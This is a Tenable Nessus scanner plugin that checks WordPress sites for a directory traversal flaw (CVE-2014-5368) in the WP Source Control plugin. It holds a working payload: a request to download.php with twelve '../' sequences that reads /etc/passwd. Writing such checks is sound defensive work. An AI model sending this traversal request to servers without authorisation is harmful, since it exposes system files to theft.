#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(77373);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2014/11/01 00:29:17 $");

  script_cve_id("CVE-2014-5368");
  script_bugtraq_id(69278);
  script_osvdb_id(110194);

  script_name(english:"WP Source Control Plugin for WordPress Directory Traversal");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a
directory traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web server is hosting a version of WP Source Control Plugin
for WordPress that is affected by a directory traversal vulnerability
due to a failure to properly sanitize user-supplied input to the
'path' parameter of the 'downloadfiles/download.php' script.
Therefore, a remote, unauthenticated attacker can read arbitrary files
by using a specially crafted request containing directory traversal
sequences.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/oss-sec/2014/q3/407");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/08/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/08/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = 'WP Source Control';

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  # check .js file first (versions 2.0+)
  checks["/wp-content/plugins/wp-source-control/admin_source_control.js"][0] =
    make_list('jQuery\\("\\.delete, \\.restore"\\)\\.click\\(function\\(\\)',
      'return confirm\\("Are you sure\\?"\\)'
   );
  # Check readme.txt (versions 1.0+)
  checks["/wp-content/plugins/wp-source-control/readme.txt"][0] = make_list(
    "WP Source Control", "Contributors: MMDeveloper");

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# According to the readme file : this plugin only works on UNIX/Linux OS.
# Unfortunately it doesn't work with WAMP.
file = 'etc/passwd';
file_pat = "root:.*:0:[01]:";

url = "/wp-content/plugins/wp-source-control/downloadfiles/download.php?path="+
  mult_str(str:"../", nb:12) + file;

res = http_send_recv3(
  method       : "GET",
  item         : dir + url,
  port         : port,
  exit_on_fail : TRUE
);

if (egrep(pattern:file_pat, string:res[2]))
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    file        : file,
    line_limit  : 10,
    request     : make_list(install_url + url),
    output      : chomp(res[2]),
    attach_type : 'text/plain'
  );
}
else audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
